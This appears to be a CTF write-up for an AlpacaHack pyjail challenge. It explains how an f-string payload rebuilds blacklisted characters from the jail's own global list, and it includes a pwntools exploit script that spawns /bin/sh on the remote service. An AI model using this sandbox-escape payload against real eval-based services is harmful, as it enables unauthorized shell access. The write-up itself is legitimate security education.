---
title: "nested eval: the jail hands you its own blacklist"
date: 2026-09-21 20:00:00 +0600
series: "AlpacaHack Daily"
platform: "AlpacaHack"
summary: "The banned characters live in a global list, and an f-string rebuilds them by index."
description: "The banned characters live in a global list, and an f-string rebuilds them by index."
tags: ["misc", "pyjail"]
---

<details class="toc" markdown="1">
<summary>Contents</summary>

* TOC
{:toc}

</details>

{% raw %}
```python
code = input("jail> ")
assert code.isascii(), "Not allowed"

prohibited = ["(", ")", "\\", "+", "__"]
assert not any(p in code for p in prohibited), "Not allowed"

eval(f"eval({code})")
```

We supply `code`, which is spliced *unquoted* into an f-string and executed. The actual statement that runs is:

```python
eval(code)
```

So whatever we type is evaluated as a Python **expression**, and the *result* is fed into a second, real `eval()`. Five substrings are blacklisted from our raw input: `(`, `)`, `\`, `+`, `__` - which rules out ordinary function calls and reduce access.

### The key insight

Both `eval()` calls run inside `chal.py`'s own module — meaning our expression executes with chal.py's **global namespace** available, including the module-level variable:

```python
prohibited = ["(", ")", "\\", "+", "__"]
```

The challenge handed us the exact banned characters, pre-packaged in a list we're allowed to reference by name! `prohibited[0]` is `"("`, `prohibited[1]` is `")"`, `prohibited[4]` is `"__"`. Referencing them via subscript (`prohibited[0]`) uses only letters, brackets, and digits - none of which are blacklisted.

### Building the payload

The target code to run is:

```python
__import__("os").system("/bin/sh")
```

`exploit.py` builds it by starting from that string literal and swapping every banned substring for an f-string placeholder that reconstructs it at runtime from `prohibited`:

```python
payload = """f'__import__("os").system("/bin/sh")'"""

payload = payload.replace('__', '{prohibited[4]}')
payload = payload.replace('(', '{prohibited[0]}')
payload = payload.replace(')', '{prohibited[1]}')
```

After the three `.replace()` calls, the literal text we actually send is:

```
f'{prohibited[4]}import{prohibited[4]}{prohibited[0]}"os"{prohibited[1]}.system{prohibited[0]}"/bin/sh"{prohibited[1]}'
```

This string contains **zero** instances of `(`, `)`, `\`, `+`, or `__` - it sails through the filter.

### Popping the shell

```python
from pwn import *

r = remote("<host>", 16807)
r.recvuntil(b"> ")

payload = """f'__import__("os").system("/bin/sh")'"""
payload = payload.replace('__', '{prohibited[4]}')
payload = payload.replace('(', '{prohibited[0]}')
payload = payload.replace(')', '{prohibited[1]}')

r.sendline(payload.encode())
r.interactive()
```
{% endraw %}
